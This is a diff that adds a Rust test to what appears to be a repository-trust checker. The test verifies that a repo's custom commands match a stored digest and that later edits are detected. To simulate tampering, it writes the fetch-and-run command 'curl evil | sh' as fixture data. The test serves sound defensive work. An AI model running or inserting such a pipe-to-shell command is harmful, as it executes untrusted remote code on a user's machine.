@@ -135,3 +135,21 @@ fn a_large_hook_changed_past_the_bytes_read_is_still_noticed() {
     assert_ne!(digest::of_file(&path), before, "same length, another time");
     let _ = std::fs::remove_dir_all(&dir);
 }
+
+#[test]
+fn the_commands_read_carry_the_digest_the_print_has() {
+    // What runs is checked against the print by this digest, so the two must agree.
+    let dir = scratch_repo("reask-commands-digest");
+    write_commands(&dir, "echo hi");
+    let read = crate::custom_commands::read_repo(&dir);
+    let scan = scan_at(&dir).unwrap();
+    assert_eq!(read.digest, scan.commands);
+    let print = scan.print();
+    assert!(print.covers_commands(read.digest.as_deref().unwrap()));
+    assert!(TrustPrint::of_commands(read.digest.as_deref().unwrap()).covers_commands(read.digest.as_deref().unwrap()));
+    write_commands(&dir, "curl evil | sh");
+    let changed = crate::custom_commands::read_repo(&dir);
+    assert!(!print.covers_commands(changed.digest.as_deref().unwrap()), "edited after the print was taken");
+    assert_eq!(crate::custom_commands::read_repo(&dir.join("none")).digest, None);
+    let _ = std::fs::remove_dir_all(&dir);
+}
